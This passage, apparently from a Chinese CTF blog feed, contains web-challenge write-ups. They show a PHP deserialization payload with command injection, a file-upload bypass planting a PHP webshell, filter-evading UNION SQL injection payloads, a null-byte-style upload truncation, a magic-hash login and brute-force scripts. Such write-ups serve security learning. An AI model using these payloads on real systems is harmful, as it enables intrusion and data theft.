class="string">"&lt;br&gt;think about it&lt;br&gt;"</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"NO"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Can you hack me?&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到这是一个常规绕过加反序列的知识点</p><p>通过变量覆盖构造payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?first=doller&amp;a=var=give%26bbb=me%26ccc=flag</span><br></pre></td></tr></table></figure><p>然后通过POST传入反序列化值，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = <span class="string">"echo"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = <span class="keyword">array</span>(<span class="string">"host"</span>=&gt;<span class="string">"`cat\$IFS/fla\g`"</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">        $str=preg_replace(<span class="string">"/[&lt;&gt;*;|?\n ]/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">        $str=str_replace(<span class="string">'flag'</span>,<span class="string">''</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo1</span><span class="params">($host)</span></span>&#123;</span><br><span class="line">        system(<span class="string">"echo $host"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"echo1"</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$he=<span class="keyword">new</span> come();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($he));</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">O%</span>3A4%3A%22come%22%3A2%3A%7Bs%3A12%3A%22%00come%00method%22%3Bs%3A4%3A%22echo%22%3Bs%3A10%3A%22%00come%00args%22%3Ba%3A1%3A%7Bs%3A4%3A%22host%22%3Bs%3A15%3A%22%60cat%24IFS%2Ffla%5Cg%60%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p><img src="4.png" alt></p><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><hr><p>主页源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">//error_reporting(0);</span></span><br><span class="line">  <span class="comment">//$dir=md5("icq" . $_SERVER['REMOTE_ADDR']);</span></span><br><span class="line">  $dir=md5(<span class="string">"icq"</span>);</span><br><span class="line">  $sandbox = <span class="string">'/var/sandbox/'</span> . $dir;</span><br><span class="line">  @mkdir($sandbox);</span><br><span class="line">  @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])&#123;</span><br><span class="line">      $filename = !<span class="keyword">empty</span>($_POST[<span class="string">'file'</span>]) ? $_POST[<span class="string">'file'</span>] : $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];<span class="comment">//上传文件</span></span><br><span class="line">      <span class="keyword">if</span> (!is_array($filename)) &#123;</span><br><span class="line">          $filename = explode(<span class="string">'.'</span>, $filename);</span><br><span class="line">      &#125;</span><br><span class="line">      $ext = end($filename);  <span class="comment">//所取POST参数最后一个值</span></span><br><span class="line">      <span class="keyword">if</span>($ext==$filename[count($filename) - <span class="number">1</span>])&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">"emmmm..."</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      $new_name = (string)rand(<span class="number">100</span>,<span class="number">999</span>).<span class="string">"."</span>.$ext; </span><br><span class="line">  <span class="comment">//php/.绕过unlink</span></span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$new_name);</span><br><span class="line">      $_ = $_POST[<span class="string">'hehe'</span>];</span><br><span class="line">      <span class="keyword">if</span>(@substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">'@&lt;?php'</span> &amp;&amp; strpos($_,$new_name)===<span class="keyword">false</span>)&#123;</span><br><span class="line">          <span class="keyword">include</span>($_);</span><br><span class="line">      &#125;</span><br><span class="line">      unlink($new_name);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $a=array();</span><br><span class="line">php &gt; $a[1]=123;</span><br><span class="line">php &gt; $a[0]=456;</span><br><span class="line">php &gt; echo end($a);</span><br><span class="line">456</span><br></pre></td></tr></table></figure><p>通过<strong>php/.</strong>绕过unlink函数，进行文件包含，保存至后台ext值仍为php，通过hehe参数（文件名）进行文件包含读取文件内容，可以上传这样一段webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(system(<span class="string">"cat /flag"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>前六个字符要求强制为  <strong>@&lt;?php</strong></p><p>然后再通过hehe爆破文件名查看flag</p><p>上传页面html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://038fde476c644c649c05c7100b41a532c772bf65d02e4fcc.game.ichunqiu.com/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">value</span>=<span class="string">"123456"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="5.png" alt></p><p><img src="6.png" alt></p><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><hr><p><img src="15.png" alt></p><p>首页sql注入，过滤了一些字符，<code>from</code>和<code>select</code>被替换为空字符，通过加空置换payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1' or (selselectect 1)#</span><br></pre></td></tr></table></figure><p><img src="16.png" alt></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; unifromon selselectect (seselectlect database()),2#</span><br></pre></td></tr></table></figure><p><img src="7.png" alt></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1' unifromon selselectect (seselectlect group_concat(table_name) frfromom information_schemafrom.tables where table_schema=database()),2#</span><br></pre></td></tr></table></figure><p><img src="8.png" alt></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1' unifromon selselectect (seselectlect group_concat(column_name) frfromom information_schemafrom.columns where table_schema='web' and table_name='user'),2#</span><br></pre></td></tr></table></figure><p><img src="9.png" alt></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1' unifromon selselectect (seselectlect concat_ws(char(32,58,32),id,username,password) frfromom web.user),2#</span><br></pre></td></tr></table></figure><p><img src="10.png" alt></p><p>注入出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span>content=str_replace($value,"",$content)1 : admin : e3274be5c857fb42ab72d786e281b4b8</span><br></pre></td></tr></table></figure><p><img src="11.png" alt></p><p>密码为adminpassword</p><p>登录进入到上传文件页面，发现要上传名为<strong>flag.php</strong>的文件</p><p>但禁止上传php文件，且上传的文件名会被加入.txt后缀名</p><p><img src="12.png" alt></p><p>发现上传的文件名由<strong>uploaddir</strong>和<strong>fileField</strong>连接组成，并可以通过%02截断进行绕过txt后缀添加</p><p><img src="13.png" alt></p><p>上传成功</p><p><img src="14.png" alt></p><p>参考链接</p><p> <a href="https://paper.seebug.org/561/" target="_blank" rel="noopener">php trick</a></p><p><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">浅谈php反序列化漏洞</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近复习网工有点小累，，有点小炸&lt;/p&gt;
&lt;p&gt;日常复盘学习不能落~~&lt;/p&gt;
&lt;p&gt;加油&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://zo1ro.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>P.W.N.CTF2018-web题解</title>
    <link href="https://zo1ro.github.io/2018/10/28/pwnctf2018/"/>
    <id>https://zo1ro.github.io/2018/10/28/pwnctf2018/</id>
    <published>2018-10-28T15:27:04.000Z</published>
    <updated>2019-05-09T16:31:12.642Z</updated>
    
    <content type="html"><![CDATA[<p>pwnctf居然有web题，，，</p><p>日常复现学习一波。。</p><a id="more"></a><h2 id="Canadian-FOI（50）"><a href="#Canadian-FOI（50）" class="headerlink" title="Canadian FOI（50）"></a>Canadian FOI（50）</h2><blockquote><p>The university has this Freedom Of Information Portal. You should check it out. To the portal</p></blockquote><p>题目通过url    <a href="http://foi.uni.hctf.fun/docs/document_001.pdf" target="_blank" rel="noopener">http://foi.uni.hctf.fun/docs/document_001.pdf</a></p><p>访问300张pdf</p><p><img src="2.png" alt></p><p>批量获取脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">"http://foi.uni.hctf.fun/docs/"</span></span><br><span class="line">PATH = <span class="string">"~/"</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(i &lt; <span class="number">300</span>):</span><br><span class="line">name = <span class="string">"document_%03d.pdf"</span> % i</span><br><span class="line">print(<span class="string">"GETTING &gt;&gt;&gt;&gt; "</span>, name)</span><br><span class="line">url = join(URL, name)</span><br><span class="line">r = requests.get(url, stream=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">if</span> (r.status_code == <span class="number">200</span>):</span><br><span class="line"><span class="keyword">with</span> open(join(PATH, name), <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(r.content)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"adios &gt;&gt;&gt;&gt; "</span>, name)</span><br><span class="line">i += <span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# pdfgrep -r "flag" ~/</span><br><span class="line">~/document_255.pdf:Here it is: flag&#123;F1rst_Gr4d3rs_4r1thm3t1c_1s_d4ng3r0us&#125;</span><br></pre></td></tr></table></figure><h2 id="Login-Sec（100）"><a href="#Login-Sec（100）" class="headerlink" title="Login Sec（100）"></a>Login Sec（100）</h2><blockquote><p>The university’s department of Secure Login Systems has just launched three prototypes of their research projects. Maybe you can have a look at all three of them:</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Login 1](http://login1.uni.hctf.fun/)</span><br><span class="line">[Source](http://dl1.uni.hctf.fun/logins/passwd.js)</span><br><span class="line">[Login 2](http://login2.uni.hctf.fun/)</span><br><span class="line">[Source](dl1.uni.hctf.fun/logins/index.php)</span><br><span class="line">[Login 3](http://login3.uni.hctf.fun/)</span><br><span class="line">[Source](dl1.uni.hctf.fun/logins/app.py)</span><br></pre></td></tr></table></figure><h4 id="Login-1-Source"><a href="#Login-1-Source" class="headerlink" title="[Login 1 Source]"></a>[Login 1 Source]</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> _0x86d1=[<span class="string">"\x68\x65\x78"</span>,<span class="string">"\x72\x61\x6E\x64\x6F\x6D\x42\x79\x74\x65\x73"</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">         &#123;</span><br><span class="line">             x: crypto[_0x86d1[<span class="number">1</span>]](<span class="number">8</span>)</span><br><span class="line">         &#125;[x].toString(_0x86d1[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]];</span><br><span class="line">&#125;</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html'</span>&#125;);</span><br><span class="line">    passwd = generatePart1() + generatePart2();</span><br><span class="line">    <span class="keyword">var</span> url_content = url.parse(req.url, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (passwd == url_content.query.passwd) &#123;</span><br><span class="line">       res.write(fs.readFileSync(<span class="string">'flag.txt'</span>, <span class="string">'utf8'</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.write(<span class="string">'&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.end();</span><br><span class="line">&#125;).listen(<span class="number">8888</span>);</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span> function generatePart2() &#123;</span><br><span class="line">     return [+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+ []+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]];</span><br><span class="line"> &#125;</span><br><span class="line">&lt; undefined</span><br><span class="line"><span class="meta">&gt;</span> generatePart2()</span><br><span class="line">&lt; "1337"</span><br></pre></td></tr></table></figure><p>参考  <a href="https://www.jianshu.com/p/e375f0fbb71c" target="_blank" rel="noopener">JavaScript自动分号补齐的坑</a></p><p><img src="1.png" alt></p><p>undefined1337传过去</p><p>flag{W0w_1_gu3ss_th1s</p><h4 id="Login-2-Source"><a href="#Login-2-Source" class="headerlink" title="[Login 2 Source]"></a>[Login 2 Source]</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (hash(<span class="string">"md5"</span>, $_GET[<span class="string">'passwd'</span>]) == <span class="string">'0e514198428367523082236389979035'</span>)        &#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>0e开头md5，随便找QNKCDZO。。。</p><p>_t0_be_4_pr3tty_</p><h4 id="Login-3-Source"><a href="#Login-3-Source" class="headerlink" title="[Login 3 Source]"></a>[Login 3 Source]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_from_directory</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">passwd = open(<span class="string">"/opt/passwd.txt"</span>).read()</span><br><span class="line">flag = open(<span class="string">"/opt/flag.txt"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    userpw = request.args.get(<span class="string">"passwd"</span>, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> userpw == passwd:</span><br><span class="line">        <span class="keyword">return</span> flag, <span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">assert</span>(len(passwd) == <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">assert</span>(passwd.isdigit())</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>三位数爆破出密码007</p><p>4_d4mn_l0ng_fl4g}</p><p>附脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    flag = login1() + login2() + login3()</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login1</span><span class="params">()</span>:</span></span><br><span class="line">    password = <span class="string">'undefined1337'</span></span><br><span class="line">    r = requests.get(<span class="string">'http://login1.uni.hctf.fun/'</span>, params=&#123;<span class="string">'passwd'</span>: password&#125;)</span><br><span class="line">    <span class="keyword">return</span> r.text.strip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login2</span><span class="params">()</span>:</span></span><br><span class="line">    password = <span class="string">'240610708'</span></span><br><span class="line">    r = requests.get(<span class="string">'http://login2.uni.hctf.fun/'</span>, params=&#123;<span class="string">'passwd'</span>: password&#125;)</span><br><span class="line">    <span class="keyword">return</span> r.text.strip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login3</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1000</span>):</span><br><span class="line">        password = str(i)</span><br><span class="line">        password = <span class="string">'0'</span> * (<span class="number">3</span> - len(password)) + password</span><br><span class="line">        r = requests.get(<span class="string">'http://login3.uni.hctf.fun/'</span>, params=&#123;<span class="string">'passwd'</span>: password&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">'&lt;html&gt;'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">return</span> r.text.strip()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>flag：flag{W0w_1_gu3ss_th1s_t0_be_4_pr3tty_4_d4mn_l0ng_fl4g}</p><h2 id="H-pster-Startup（200）"><a href="#H-pster-Startup（200）" class="headerlink" title="H!pster Startup（200）"></a>H!pster Startup（200）</h2><blockquote><p>Our on-campus start-up was hacked. The hacker somehow deleted the only admin user… Can you login to the admin interface and revert it?</p></blockquote><p>源码发现admin登录后台</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--  Main navigation  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"main-nav nav navbar-nav navbar-right"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#home"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#service"</span>&gt;</span>Services<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- &lt;li&gt;&lt;a href="/admin"&gt;Admin-Panel&lt;/a&gt;&lt;/li&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- /Main navigation --&gt;</span></span><br></pre></td></tr></table></figure><p><img src="3.png" alt></p><p>发送’过去</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 